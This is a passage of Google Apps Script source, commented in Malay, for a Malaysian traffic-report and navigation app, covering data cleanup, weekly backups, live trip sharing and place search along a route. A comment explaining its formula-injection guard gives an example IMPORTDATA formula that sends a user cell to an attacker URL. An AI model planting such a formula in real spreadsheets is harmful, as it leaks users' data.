  'kiri', 'kanan', 'utara', 'selatan', 'timur', 'barat', 'timur laut', 'barat laut', 'tenggara', 'barat daya',
  'left', 'right', 'north', 'south', 'east', 'west', 'northeast', 'northwest', 'southeast', 'southwest',
  'north-east', 'north-west', 'south-east', 'south-west'
].join('|') + ')$', 'i');

/**
 * Nama jalan/destinasi = kumpulan teks tebal terakhir yang bukan kata arah.
 * Teks tebal yang hanya dipisahkan oleh "/" atau "," digabung (cth. "E6 ELITE / Bandar Serenia").
 */
function roadName_(html) {
  const main = html.replace(/<div[^>]*>[\s\S]*$/, ''); // buang nota tambahan (cth. "Destinasi di kiri")
  const re = /<b>([\s\S]*?)<\/b>/g;
  const groups = [];
  let m, lastEnd = -1;
  while ((m = re.exec(main))) {
    const txt = stripHtml_(m[1]);
    if (!txt || DIRECTION_WORDS_.test(txt)) { lastEnd = -1; continue; }
    const gap = lastEnd >= 0 ? main.slice(lastEnd, m.index) : null;
    if (gap !== null && /^\s*[\/,]\s*$/.test(gap)) groups[groups.length - 1].push(txt);
    else groups.push([txt]);
    lastEnd = re.lastIndex;
  }
  return groups.length ? groups[groups.length - 1].join(' / ') : '';
}

/** Nombor susur keluar lebuh raya, cth. "Take exit <b>612</b>" → "612". */
function exitNumber_(html) {
  const m = html.match(/(?:exit|keluar)\s*(?:<b>)?\s*(\d{1,4}[A-Z]?)\s*(?:<\/b>)?(?![\d.])/i);
  return m ? m[1] : '';
}

// ---------------------------------------------------------------- Penyelenggaraan

function cleanup(e) {
  if (!isRealTrigger_(e) && !isOwner_()) throw new Error('Tidak dibenarkan.');
  const lock = lock_(30000);
  try {
    const now = Date.now();
    pruneSheet_(getSheet_(SHEET_REPORTS), REPORT_HEADERS.length,
      x => new Date(x[8]).getTime() > now && !isHidden_(Number(x[9]), Number(x[10])));
    // Lokasi kini dalam cache. Ini hanya mengosongkan baris lama dari versi sebelum ini (kosong selepas sejam).
    const usersSh = getSheet_(SHEET_USERS);
    if (usersSh) pruneSheet_(usersSh, USER_HEADERS.length,
      x => new Date(x[6]).getTime() > now - CONFIG.USER_RETAIN_SEC * 1000);
    // Privasi: padam data pengguna (termasuk lokasi rumah) yang tidak dikemas kini selama 180 hari
    pruneSheet_(prefsSheet_(), PREFS_HEADERS.length,
      x => new Date(x[2]).getTime() > now - CONFIG.PREFS_RETAIN_DAYS * 864e5);
    // Privasi: rekod perkongsian perjalanan dipadam sehari selepas tamat
    pruneSheet_(sharesSheet_(), SHARE_HEADERS.length, x => new Date(x[8]).getTime() > now - 864e5);
    // Statistik tidak aktif setahun dipadam; tanpa ini sheet penuh (MAX_STATS_ROWS) dan pengguna baharu tidak dapat mata.
    // Baris lama tanpa lajur "Aktif" guna tarikh "Sertai".
    const stats = statsSheet_();
    if (stats.getRange(1, 7).getValue() !== 'Aktif') stats.getRange(1, 7).setValue('Aktif').setFontWeight('bold');
    pruneSheet_(stats, STATS_HEADERS.length,
      x => new Date(x[6] || x[5]).getTime() > now - CONFIG.STATS_RETAIN_DAYS * 864e5);
    rebuildReports_();
  } finally {
    lock.releaseLock();
  }
  // Isnin pagi: sandaran data & e-mel ringkasan kepada pemilik (guna pencetus setiap jam yang sedia ada)
  try { weeklyTasks_(false); } catch (err) { console.error('weeklyTasks_: ' + err.message); }
}

// ---------------------------------------------------------------- Ringkasan mingguan & sandaran
// Kiraan harian (PropertiesService 'DAILY'): { 'yyyy-mm-dd': { r: laporan baharu, n: carian laluan, b: "Sistem sibuk" } }.
// Baca-ubah-tulis tanpa kunci → beberapa kiraan mungkin hilang bila serentak; cukup untuk anggaran mingguan.
const BACKUP_KEEP_ = 4;   // simpan 4 sandaran mingguan terakhir
function dayKey_(t) { return new Date(t + 8 * 3600e3).toISOString().slice(0, 10); }   // tarikh Malaysia (UTC+8)
function bumpDaily_(field, n) {
  try {
    const props = PropertiesService.getScriptProperties(), k = dayKey_(Date.now());
    const d = parseJson_(props.getProperty('DAILY')) || {};
    d[k] = d[k] || {};
    d[k][field] = (Number(d[k][field]) || 0) + (n || 1);
    Object.keys(d).sort().slice(0, -21).forEach(x => { delete d[x]; });
    props.setProperty('DAILY', JSON.stringify(d));
  } catch (e) { /* kiraan tidak kritikal */ }
}

/** Ringkasan 7 hari lepas (tidak termasuk hari ini). */
function weeklySummary_(now) {
  const days = [];
  for (let i = 7; i >= 1; i--) days.push(dayKey_(now - i * 864e5));
  const d = parseJson_(PropertiesService.getScriptProperties().getProperty('DAILY')) || {};
  const sum = f => days.reduce((a, k) => a + (Number(d[k] && d[k][f]) || 0), 0);
  const sh = statsSheet_(), last = sh.getLastRow();
  const rows = last < 2 ? [] : sh.getRange(2, 1, last - 1, STATS_HEADERS.length).getValues().filter(x => x[0]);
  const since = now - 7 * 864e5, t = v => new Date(v).getTime();
  return {
    from: days[0], to: days[6],
    active: rows.filter(x => t(x[6] || x[5]) > since).length,
    joined: rows.filter(x => t(x[5]) > since).length,
    users: rows.length,
    reports: sum('r'), routes: sum('n'), busy: sum('b'),
    activeReports: getReports_().length
  };
}

/** Salin helaian data ke hamparan "JalanKita — Sandaran" (dalam Drive pemilik); simpan BACKUP_KEEP_ minggu terakhir. */
function backupSheets_(now) {
  const props = PropertiesService.getScriptProperties();
  const ss = SpreadsheetApp.openById(props.getProperty('SHEET_ID'));
  let bk = null;
  const id = props.getProperty('BACKUP_ID');
  if (id) { try { bk = SpreadsheetApp.openById(id); } catch (e) { bk = null; } }
  if (!bk) { bk = SpreadsheetApp.create('JalanKita — Sandaran'); props.setProperty('BACKUP_ID', bk.getId()); }
  const tag = dayKey_(now);
  [SHEET_REPORTS, SHEET_STATS, SHEET_PREFS, SHEET_SHARES].forEach(name => {
    const sh = ss.getSheetByName(name);
    if (!sh) return;
    const old = bk.getSheetByName(name + ' ' + tag);
    if (old) bk.deleteSheet(old);
    sh.copyTo(bk).setName(name + ' ' + tag);
  });
  const tagOf = s => { const m = s.getName().match(/ (\d{4}-\d{2}-\d{2})$/); return m ? m[1] : null; };
  const keep = bk.getSheets().map(tagOf).filter(Boolean).filter((x, i, a) => a.indexOf(x) === i).sort().reverse()
    .slice(0, BACKUP_KEEP_);
  bk.getSheets().forEach(s => { if (keep.indexOf(tagOf(s)) < 0) bk.deleteSheet(s); });   // lama + "Sheet1" asal
  return { url: bk.getUrl(), tag: tag };
}

function weeklyTasks_(force) {
  const props = PropertiesService.getScriptProperties(), now = Date.now(), today = dayKey_(now);
  if (!force) {
    const my = new Date(now + 8 * 3600e3);
    if (my.getUTCDay() !== 1 || my.getUTCHours() < 8) return null;      // Isnin, selepas 8 pagi
    if (props.getProperty('WEEKLY_LAST') === today) return null;       // sekali seminggu
  }
  props.setProperty('WEEKLY_LAST', today);
  let backup = null, backupErr = '';
  try { backup = backupSheets_(now); } catch (e) { backupErr = String(e && e.message || e).slice(0, 200); }
  const s = weeklySummary_(now);
  const esc = v => String(v).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
  const row = (k, v) => '<tr><td style="padding:4px 12px 4px 0;color:#555">' + k + '</td><td><b>' + esc(v) + '</b></td></tr>';
  const html = '<h2 style="margin:0 0 8px">Jalan Malaysia · ringkasan minggu lepas</h2>' +
    '<p style="color:#555">' + esc(s.from) + ' hingga ' + esc(s.to) + '</p><table>' +
    row('Pengguna aktif', s.active) + row('Pengguna baharu', s.joined) + row('Jumlah pengguna (setahun)', s.users) +
    row('Laporan baharu', s.reports) + row('Carian laluan', s.routes) + row('Laporan aktif sekarang', s.activeReports) +
    row('"Sistem sibuk" (server penuh)', s.busy) + '</table>' +
    (s.busy > 20 ? '<p>⚠️ Server kerap sibuk minggu lepas. Beritahu pembangun.</p>' : '') +
    (backup ? '<p>💾 Sandaran data: <a href="' + esc(backup.url) + '">JalanKita — Sandaran</a> (' + esc(backup.tag) +
      ', ' + BACKUP_KEEP_ + ' minggu terakhir disimpan)</p>' : '<p>⚠️ Sandaran gagal: ' + esc(backupErr) + '</p>');
  MailApp.sendEmail({ to: Session.getEffectiveUser().getEmail(), subject: 'Jalan Malaysia · Ringkasan mingguan ' + s.to,
    htmlBody: html, name: 'Jalan Malaysia' });
  return { summary: s, backup: backup, backupErr: backupErr };
}

/** Pemilik: jalankan sekali dari editor Apps Script (butang Run) untuk memberi kebenaran e-mel & menguji ringkasan. */
function weeklyReportNow() {
  if (!isOwner_()) throw new Error('Tidak dibenarkan.');
  return weeklyTasks_(true);
}

function pruneSheet_(sh, width, keepFn) {
  const last = sh.getLastRow();
  if (last < 2) return;
  const range = sh.getRange(2, 1, last - 1, width);
  const rows = range.getValues(), keep = rows.filter(keepFn).map(r => r.map(protectCell_));
  if (keep.length === rows.length) return;   // tiada yang dibuang — jangan tulis semula seluruh sheet setiap jam
  range.clearContent();
  if (keep.length) sh.getRange(2, 1, keep.length, width).setValues(keep);
}

// ---------------------------------------------------------------- Utiliti

function isValidCoord_(lat, lng) {
  return isFinite(lat) && isFinite(lng) && Math.abs(lat) <= 90 && Math.abs(lng) <= 180;
}

/** Teks bebas daripada pengguna → nilai sel yang selamat. */
function cell_(s, max) {
  const t = String(s == null ? '' : s).replace(/[\u0000-\u001f<>]/g, '').trim().slice(0, max);
  return protectCell_(t);
}

/**
 * Halang suntikan formula Sheets: teks bermula = + - @ akan dinilai sebagai formula
 * (cth. =IMPORTDATA("https://penyerang/?"&Pengguna!C2) boleh membocorkan data).
 * Awalan ' menjadikannya teks biasa; getValues() tidak memulangkan aksara ' itu.
 */
function protectCell_(v) {
  return (typeof v === 'string' && /^[=+\-@]/.test(v)) ? "'" + v : v;
}

function stripHtml_(s) {
  return String(s || '').replace(/<div[^>]*>/g, ' — ').replace(/<[^>]+>/g, '')
    .replace(/&nbsp;/g, ' ').replace(/&amp;/g, '&').trim();
}

function round_(n, d) { const f = Math.pow(10, d); return Math.round(n * f) / f; }
function clamp_(n, lo, hi) { return Math.min(hi, Math.max(lo, n)); }

function distKm_(lat1, lng1, lat2, lng2) {
  const r = Math.PI / 180;
  const h = Math.pow(Math.sin((lat2 - lat1) * r / 2), 2) +
    Math.cos(lat1 * r) * Math.cos(lat2 * r) * Math.pow(Math.sin((lng2 - lng1) * r / 2), 2);
  return 12742 * Math.asin(Math.sqrt(h));
}


// ---------------------------------------------------------------- Kongsi perjalanan langsung
// Pemandu menghantar lokasi setiap ~10 s ke cache (pantas); Sheet dikemas kini paling kerap sekali seminit.
// Sesiapa yang ada pautan (ID rawak 128-bit) dan log masuk boleh melihat — hanya pemandu itu, hanya semasa aktif.
// Bila tamat (tempoh / tiba / dihentikan): lokasi dipadam serta-merta; rekod dipadam sehari kemudian.

const SHEET_SHARES = 'Kongsi';
const SHARE_HEADERS = ['ID', 'PenggunaID', 'Nama', 'Destinasi', 'DestLat', 'DestLng', 'Laluan', 'Mula', 'TamatTempoh',
  'Status', 'Lat', 'Lng', 'Arah', 'Kelajuan', 'Tiba', 'Kemaskini'];
const SHARE_ID_RE_ = /^[0-9a-f]{32}$/;
const SHARE_LIVE_ = ['live', 'arrive'];      // live = ikut tempoh; arrive = sampai destinasi

function sharesSheet_() {
  const id = PropertiesService.getScriptProperties().getProperty('SHEET_ID');
  if (!id) throw new Error('Sistem belum disediakan.');
  const ss = SpreadsheetApp.openById(id);
  return ss.getSheetByName(SHEET_SHARES) || ensureSheet_(ss, SHEET_SHARES, SHARE_HEADERS);
}

/** Polyline Google: aksara ASCII sahaja, maks 20,000 aksara. Nilai lain dibuang. */
function cleanPolyline_(p) {
  p = typeof p === 'string' ? p : '';
  return p.length <= 20000 && /^[\x21-\x7e]*$/.test(p) ? p : '';
}
function shareLive_(o, now) {
  const lat = Number(o.lat), lng = Number(o.lng);
  if (!isValidCoord_(lat, lng)) return null;
  const h = Number(o.heading), v = Number(o.speed), eta = Number(o.etaSec);
  return { lat: lat, lng: lng, h: isFinite(h) && h >= 0 && h < 360 ? Math.round(h) : null,
    v: isFinite(v) && v >= 0 && v < 300 ? Math.round(v) : 0,
    eta: isFinite(eta) && eta > 0 && eta < 86400 ? now + Math.round(eta) * 1000 : null, t: now };
}
function shareActive_(m, now) { return !!m && SHARE_LIVE_.indexOf(m.st) >= 0 && m.exp > now; }

/** Maklumat perkongsian (cache 6 jam; jika tiada, baca Sheet). null jika tidak wujud. */
function shareMeta_(id) {
  const cache = CacheService.getScriptCache(), hit = cache.get('shm_' + id);
  if (hit) return JSON.parse(hit);
  const sh = sharesSheet_(), last = sh.getLastRow();
  if (last < 2) return null;
  const rows = sh.getRange(2, 1, last - 1, SHARE_HEADERS.length).getValues();
  const x = rows.find(v => String(v[0]) === id);
  if (!x) return null;
  const m = { owner: String(x[1]), name: String(x[2]), dt: String(x[3]), dlat: x[4] === '' ? null : Number(x[4]),
    dlng: x[5] === '' ? null : Number(x[5]), exp: new Date(x[8]).getTime(), st: String(x[9]), pv: 1, wrote: Date.now() };
  cache.put('shm_' + id, JSON.stringify(m), 21600);
  cache.put('shp_' + id, String(x[6] || ''), 21600);
  if (x[10] !== '' && !cache.get('sh_' + id)) {
    const live = shareLive_({ lat: x[10], lng: x[11], heading: x[12], speed: x[13] }, new Date(x[15]).getTime());
    if (live) { live.eta = x[14] === '' ? null : Number(x[14]); cache.put('sh_' + id, JSON.stringify(live), 21600); }
  }
  return m;
}
function saveShareMeta_(id, m) { CacheService.getScriptCache().put('shm_' + id, JSON.stringify(m), 21600); }

/** Tulis status/lokasi ke Sheet. live = null → lokasi dipadam. */
function writeShare_(id, st, live, poly) {
  const lock = lock_();
  try {
    const sh = sharesSheet_(), last = sh.getLastRow();
    if (last < 2) return;
    const ids = sh.getRange(2, 1, last - 1, 1).getValues();
    const i = ids.findIndex(v => String(v[0]) === id);
    if (i < 0) return;
    const row = i + 2;
    if (poly != null) sh.getRange(row, 7).setValue(protectCell_(poly));
    sh.getRange(row, 10, 1, 7).setValues([[st,
      live ? live.lat : '', live ? live.lng : '', live && live.h != null ? live.h : '', live ? live.v : '',
      live && live.eta ? live.eta : '', new Date()]]);
  } finally {
    lock.releaseLock();
  }
}

function startShare(token, o) {
  const userId = verify_(token);
  o = o || {};
  rateLimit_('share', userId);
  const minutes = [15, 60, 240, 0].indexOf(Number(o.minutes)) >= 0 ? Number(o.minutes) : 60;
  const now = Date.now(), live = shareLive_(o, now);
  if (!live) throw new Error('Lokasi anda belum diketahui.');
  const d = o.dest || {}, dLat = Number(d.lat), dLng = Number(d.lng), hasDest = isValidCoord_(dLat, dLng);
  if (minutes === 0 && !hasDest) throw new Error('Mulakan navigasi dahulu untuk kongsi sehingga sampai destinasi.');
  const id = Utilities.getUuid().replace(/-/g, '');
  const exp = now + (minutes || CONFIG.SHARE_MAX_MIN) * 60000;
  const poly = cleanPolyline_(o.polyline), name = cell_(o.name, 30) || 'Pemandu';
  const m = { owner: userId, name: name.replace(/^'/, ''), dt: hasDest ? String(cell_(d.title, 80)).replace(/^'/, '') : '',
    dlat: hasDest ? dLat : null, dlng: hasDest ? dLng : null, exp: exp, st: minutes ? 'live' : 'arrive', pv: 1, wrote: now };

  const lock = lock_();
  try {
    const sh = sharesSheet_(), last = sh.getLastRow();
    // Satu perkongsian aktif bagi setiap pengguna: yang lama ditamatkan & lokasinya dipadam
    if (last >= 2) {
      const rows = sh.getRange(2, 1, last - 1, SHARE_HEADERS.length).getValues();
      rows.forEach((x, i) => {
        if (String(x[1]) !== userId || SHARE_LIVE_.indexOf(String(x[9])) < 0) return;
        sh.getRange(i + 2, 10, 1, 7).setValues([['stopped', '', '', '', '', '', new Date()]]);
        endShareCache_(String(x[0]), 'stopped');
      });
      if (last - 1 >= CONFIG.MAX_SHARES) throw new Error('Sistem penuh buat sementara. Cuba lagi nanti.');
    }
    sh.appendRow([id, userId, name, hasDest ? cell_(d.title, 80) : '', hasDest ? dLat : '', hasDest ? dLng : '',
      protectCell_(poly), new Date(now), new Date(exp), m.st, live.lat, live.lng, live.h == null ? '' : live.h, live.v,
      live.eta || '', new Date(now)]);
  } finally {
    lock.releaseLock();
  }
  const cache = CacheService.getScriptCache();
  saveShareMeta_(id, m);
  cache.put('shp_' + id, poly, 21600);
  cache.put('sh_' + id, JSON.stringify(live), 21600);
  return { id: id, exp: exp, mode: m.st, url: (ScriptApp.getService().getUrl() || '') + '?track=' + id };
}

function endShareCache_(id, st) {
  const cache = CacheService.getScriptCache(), hit = cache.get('shm_' + id);
  cache.remove('sh_' + id);
  if (hit) { const m = JSON.parse(hit); m.st = st; saveShareMeta_(id, m); }
}

function updateShare(token, id, o) {
  const userId = verify_(token);
  id = String(id || ''); o = o || {};
  if (!SHARE_ID_RE_.test(id)) throw new Error('Perkongsian tidak dijumpai.');
  rateLimit_('shareUpd', userId);
  const m = shareMeta_(id), now = Date.now();
  if (!m || m.owner !== userId) throw new Error('Perkongsian tidak dijumpai.');
  if (!shareActive_(m, now)) {
    if (SHARE_LIVE_.indexOf(m.st) >= 0) { writeShare_(id, 'expired', null, null); endShareCache_(id, 'expired'); }
    return { ended: true };
  }
  if (o.arrived === true) {
    writeShare_(id, 'arrived', null, null); endShareCache_(id, 'arrived');
    return { ended: true };
  }
  const live = shareLive_(o, now);
  if (!live) throw new Error('Lokasi tidak sah.');
  const cache = CacheService.getScriptCache();
  cache.put('sh_' + id, JSON.stringify(live), 21600);
  let poly = null;
  if (typeof o.polyline === 'string') {
    poly = cleanPolyline_(o.polyline);
    cache.put('shp_' + id, poly, 21600); m.pv = (m.pv || 1) + 1;
  }
  if (poly != null || now - (m.wrote || 0) > 60000) { writeShare_(id, m.st, live, poly); m.wrote = now; }
  saveShareMeta_(id, m);
  return { ok: true, exp: m.exp };
}

function stopShare(token, id) {
  const userId = verify_(token);
  id = String(id || '');
  if (!SHARE_ID_RE_.test(id)) throw new Error('Perkongsian tidak dijumpai.');
  rateLimit_('share', userId);
  const m = shareMeta_(id);
  if (!m || m.owner !== userId) throw new Error('Perkongsian tidak dijumpai.');
  writeShare_(id, 'stopped', null, null);
  endShareCache_(id, 'stopped');
  return { ok: true };
}

/** Untuk orang yang membuka pautan. pv = versi laluan yang sudah ada (laluan hanya dihantar bila berubah). */
function viewShare(token, id, pv) {
  const viewer = verify_(token);
  id = String(id || '');
  if (!SHARE_ID_RE_.test(id)) return { status: 'ended' };
  rateLimit_('shareView', viewer);
  const m = shareMeta_(id), now = Date.now();
  if (!m) return { status: 'ended' };                 // tidak wujud = sama seperti tamat (tiada petunjuk)
  const dest = m.dlat == null ? null : { title: m.dt, lat: m.dlat, lng: m.dlng };
  if (!shareActive_(m, now)) {
    return { status: m.st === 'arrived' ? 'arrived' : 'ended', name: m.name, dest: m.st === 'arrived' ? dest : null };
  }
  const cache = CacheService.getScriptCache(), raw = cache.get('sh_' + id);
  const live = raw ? JSON.parse(raw) : null;
  const out = { status: 'live', name: m.name, dest: dest, exp: m.exp, pv: m.pv || 1, live: live };
  if (Number(pv) !== (m.pv || 1)) out.polyline = cache.get('shp_' + id) || '';
  return out;
}

// ---------------------------------------------------------------- Cari di sepanjang laluan (OpenStreetMap Overpass)
// URL perkhidmatan TETAP (tiada SSRF). Kategori dari senarai tetap — pengguna tidak boleh menulis pertanyaan sendiri.
// Privasi: titik laluan dibundarkan ~100 m dan klien hanya menghantar laluan DI HADAPAN (bukan lokasi semasa tepat).

const ALONG_CATS_ = {
  fuel:   { q: '["amenity"="fuel"]', label: 'Stesen minyak', r: 300 },
  rest:   { q: '["highway"~"^(rest_area|services)$"]', label: 'R&R', r: 600 },
  mosque: { q: '["amenity"="place_of_worship"]["religion"="muslim"]', label: 'Masjid / surau', r: 400 },
  toilet: { q: '["amenity"="toilets"]', label: 'Tandas', r: 300 },
  food:   { q: '["amenity"~"^(restaurant|fast_food|cafe|food_court)$"]', label: 'Makan', r: 300 },
  atm:    { q: '["amenity"="atm"]', label: 'ATM', r: 300 },
  ev:     { q: '["amenity"="charging_station"]', label: 'Caj EV', r: 500 },
  train:  { q: '["railway"~"^(station|halt)$"]', label: 'Stesen tren', r: 800 },   // KTM Komuter, ETS, LRT, MRT, Monorel
  bus:    { q: '["amenity"="bus_station"]', label: 'Stesen bas', r: 800 }
};

// Pelayan Overpass awam (percuma). Pelayan utama kadang-kadang tidak dapat dihubungi dari server Google
// ("Address unavailable"), jadi cuba pelayan sandaran mengikut giliran. Senarai TETAP — bukan dari pengguna (tiada SSRF).
const OVERPASS_URLS_ = ['https://overpass-api.de/api/interpreter', 'https://overpass.kumi.systems/api/interpreter',
  'https://overpass.private.coffee/api/interpreter'];

/** Hantar pertanyaan ke pelayan Overpass yang berfungsi. Pelayan yang berjaya diingat 1 jam. Ralat dalaman tidak didedahkan. */
function overpass_(q) {
  const cache = CacheService.getScriptCache();
  const first = Number(cache.get('ov_ok') || 0) % OVERPASS_URLS_.length;
  for (let k = 0; k < OVERPASS_URLS_.length; k++) {
    const i = (first + k) % OVERPASS_URLS_.length;
    try {
      const res = UrlFetchApp.fetch(OVERPASS_URLS_[i], {
        method: 'post', payload: { data: q }, muteHttpExceptions: true, followRedirects: false });
      if (res.getResponseCode() !== 200) continue;
      const data = JSON.parse(res.getContentText());
      cache.put('ov_ok', String(i), 3600);
      return data;
    } catch (e) { /* tidak dapat dihubungi / jawapan rosak → cuba pelayan seterusnya */ }
  }
  throw new Error('Carian sepanjang laluan tidak tersedia sekarang. Cuba lagi sebentar.');
}

function alongRoute(token, cat, pts) {
  const userId = verify_(token);
  const c = ALONG_CATS_.hasOwnProperty(String(cat)) ? ALONG_CATS_[cat] : null;
  if (!c) throw new Error('Kategori tidak sah.');
  if (!Array.isArray(pts)) throw new Error('Laluan tidak sah.');
  const coords = pts.slice(0, 60).map(p => Array.isArray(p) ? [Number(p[0]), Number(p[1])] : [NaN, NaN])
    .filter(p => isValidCoord_(p[0], p[1])).map(p => p[0].toFixed(3) + ',' + p[1].toFixed(3));
  if (coords.length < 2) return [];
  const cache = CacheService.getScriptCache();
  const ck = 'al_' + hash_(cat + '|' + coords.join(',')).slice(0, 40);
  const hit = cache.get(ck);
  if (hit) return JSON.parse(hit);
  rateLimit_('along', userId);
  // 1. Photon (sudah terbukti berfungsi dari server Google) — beberapa titik laluan dicari serentak
  // 2. Overpass — hanya jika Photon gagal (pelayan Overpass percuma kerap lambat / menyekat server Google)
  // Overpass TIDAK dicuba dari server: UrlFetch tiada had masa sendiri (~60 s bagi setiap pelayan yang lambat), jadi
  // pengguna menunggu lama. Bila Photon gagal, telefon terus ke Overpass (had masa pendek, pelayan dicuba serentak).
  let out;
  try { out = photonAlong_(cat, coords); } catch (e) {
    if (/Terlalu banyak/.test(e.message)) throw e;
    // Butiran teknikal (kod HTTP Photon) hanya untuk pemilik — untuk siasatan
    const detail = isOwner_() ? ' [Photon server: ' + (e.detail || String(e.message).slice(0, 60)) + ']' : '';
    throw new Error('Carian sepanjang laluan tidak tersedia sekarang. Cuba lagi sebentar.' + detail);
  }
  try { cache.put(ck, JSON.stringify(out), 600); } catch (e) { /* abaikan */ }
  return out;
}

// Tag OSM bagi setiap kategori untuk Photon (lebih daripada satu = "atau")
const PHOTON_TAGS_ = { fuel: ['amenity:fuel'], rest: ['highway:services', 'highway:rest_area'],
  mosque: ['amenity:place_of_worship'], toilet: ['amenity:toilets'], atm: ['amenity:atm'], ev: ['amenity:charging_station'],
  food: ['amenity:restaurant', 'amenity:fast_food', 'amenity:cafe', 'amenity:food_court'],
  train: ['railway:station', 'railway:halt'], bus: ['amenity:bus_station', 'highway:bus_stop'] };

/**
 * Cari tempat berhampiran ≤15 titik laluan (radius 2 km) dengan Photon /reverse — permintaan serentak (fetchAll).
 * Titik dibundarkan ke grid ~1 km dan hasil setiap titik disimpan 1 jam: bila pemandu bergerak atau menukar
 * kategori, kebanyakan titik tidak perlu ditanya lagi (jimat kuota & lebih pantas).
 */
function photonAlong_(cat, coords, radiusKm) {
  const rad = radiusKm || 2;
  const every = Math.max(1, Math.ceil(coords.length / 15)), seen = {};
  const pick = coords.filter((x, i) => i % every === 0).map(x => x.split(',').map(v => Number(v).toFixed(2)).join(','))
    .filter(x => !seen[x] && (seen[x] = true)).slice(0, 15);
  const cache = CacheService.getScriptCache(), out = [], need = [];
  pick.forEach(x => {
    const hit = cache.get('pa_' + cat + '_' + rad + '_' + x);
    if (hit != null) JSON.parse(hit).forEach(p => out.push(p)); else need.push(x);
  });
  let answered = pick.length - need.length;
  const codes = {};
  if (need.length) {
    rateLimit_('G_photonAlong', null, need.length);
    const tags = PHOTON_TAGS_[cat].map(t => '&osm_tag=' + encodeURIComponent(t)).join('');
    let res;
    try { res = UrlFetchApp.fetchAll(need.map(x => {
      const ll = x.split(',');
      return { url: 'https://photon.komoot.io/reverse?lat=' + ll[0] + '&lon=' + ll[1] + '&radius=' + rad + '&limit=' + (rad > 2 ? 30 : 15) + tags,
        muteHttpExceptions: true, followRedirects: false };
    })); } catch (e) {
      const err = new Error('Photon tidak menjawab.'); err.detail = String(e && e.message || e).slice(0, 80); throw err;
    }
    res.forEach((rr, i) => {
      const code = rr.getResponseCode();
      codes[code] = (codes[code] || 0) + 1;
      if (code !== 200) return;
      let d;
      try { d = JSON.parse(rr.getContentText()); } catch (e) { return; }
      answered++;
      const found = photonPlaces_(cat, d);
      found.forEach(p => out.push(p));
      try { cache.put('pa_' + cat + '_' + rad + '_' + need[i], JSON.stringify(found), 3600); } catch (e) { /* abaikan */ }
    });
  }
  if (!answered) {
    const err = new Error('Photon tidak menjawab.');
    err.detail = 'HTTP ' + Object.keys(codes).map(k => k + '×' + codes[k]).join(', ');
    throw err;
  }
  return dedupePlaces_(out.filter(Boolean)).slice(0, 80);
}

function photonPlaces_(cat, d) {
  const out = [];
  (d.features || []).forEach(f => {
    const p = f.properties || {}, g = (f.geometry && f.geometry.coordinates) || [];
    // Semak semula jenis tempat (jika Photon mengabaikan penapis, jalan/alamat biasa tidak dipaparkan sebagai "stesen minyak")
    if (p.osm_key && PHOTON_TAGS_[cat].indexOf(p.osm_key + ':' + p.osm_value) < 0) return;
    // Photon tidak boleh menapis agama — kenal pasti masjid / surau daripada nama
    if (cat === 'mosque' && !/masjid|surau|mosque|musol+a|musal+a/i.test(String(p.name || ''))) return;
    out.push(placeOut_(p.name || ALONG_CATS_[cat].label, [p.street, p.city].filter(Boolean).join(', '), g[1], g[0], 'osm'));
  });
  return out.filter(Boolean);
}

function overpassAlong_(c, coords, radiusM) {
  rateLimit_('G_overpass');
  const q = '[out:json][timeout:12];nw' + c.q + '(around:' + (radiusM || c.r) + ',' + coords.join(',') + ');out center 80;';
  const data = overpass_(q);
  return (data.elements || []).map(el => {
    const t = el.tags || {}, lat = el.lat != null ? el.lat : el.center && el.center.lat;
    const lng = el.lon != null ? el.lon : el.center && el.center.lon;
    const title = t.name || t.brand || t.operator || c.label;
    const sub = [t.brand && t.brand !== title ? t.brand : '', t['addr:street'] || ''].filter(Boolean).join(' · ');
    return placeOut_(title, sub, lat, lng, 'osm');
  }).filter(Boolean).slice(0, 80);
}

/**
 * Tempat berdekatan (cth. stesen tren / bas, stesen minyak) dalam radius ~5 km dari pengguna.
 * Lokasi dibundarkan ~1 km sebelum dihantar ke Photon (privasi); hasil grid disimpan 1 jam.
 */
function nearbyPlaces(token, cat, lat, lng) {
  const userId = verify_(token);
  const c = ALONG_CATS_.hasOwnProperty(String(cat)) ? ALONG_CATS_[cat] : null;
  if (!c) throw new Error('Kategori tidak sah.');
  lat = Number(lat); lng = Number(lng);
  if (!isValidCoord_(lat, lng)) throw new Error('Lokasi tidak sah.');
  rateLimit_('along', userId);
  const p = lat.toFixed(2) + ',' + lng.toFixed(2);
  try { return photonAlong_(cat, [p], 5); } catch (e) {
    if (/Terlalu banyak/.test(e.message)) throw e;
    return overpassAlong_(c, [p], 4000);
  }
}

// ---------------------------------------------------------------- Panel pentadbir (pemilik skrip sahaja)
// Setiap fungsi menyemak isOwner_() di server — butang yang tersembunyi di klien BUKAN kawalan keselamatan.

function requireOwner_(token) {
  const uid = verify_(token);
  if (!isOwner_()) throw new Error('Tidak dibenarkan.');
  rateLimit_('admin', 'owner');
  return uid;
}

function bannedList_() {
  const cache = CacheService.getScriptCache(), hit = cache.get('banned');
  if (hit != null) return JSON.parse(hit);
  let list = [];
  try { list = JSON.parse(PropertiesService.getScriptProperties().getProperty('BANNED') || '[]'); } catch (e) { list = []; }
  if (!Array.isArray(list)) list = [];
  cache.put('banned', JSON.stringify(list), 600);
  return list;
}

function adminOverview(token) {
  requireOwner_(token);
  const now = Date.now(), cache = CacheService.getScriptCache();
  const rs = getSheet_(SHEET_REPORTS), lastR = rs.getLastRow();
  const reps = lastR < 2 ? [] : rs.getRange(2, 1, lastR - 1, REPORT_HEADERS.length).getValues()
    .filter(x => new Date(x[8]).getTime() > now)
    .map(x => ({ id: String(x[0]), type: String(x[1]), lat: Number(x[2]), lng: Number(x[3]), desc: String(x[4] || ''),
      user: String(x[5]), name: String(x[6] || ''), time: new Date(x[7]).getTime(), up: Number(x[9]), down: Number(x[10]),
      hidden: isHidden_(Number(x[9]), Number(x[10])) }))
    .sort((a, b) => b.time - a.time);
  // Indeks u_all dikemas kini paling kerap sekali setiap 5 minit bagi seorang pengguna, jadi "aktif" = 5 minit lalu (anggaran)
  const allIdx = parseJson_(cache.get('u_all')) || {};
  const seen = Object.keys(allIdx).map(k => Number(allIdx[k]) * 1000);
  let shares = 0;
  try {
    const ss = sharesSheet_(), lastS = ss.getLastRow();
    if (lastS >= 2) shares = ss.getRange(2, 9, lastS - 1, 2).getValues()
      .filter(x => new Date(x[0]).getTime() > now && SHARE_LIVE_.indexOf(String(x[1])) >= 0).length;
  } catch (e) { /* tiada Sheet lagi */ }
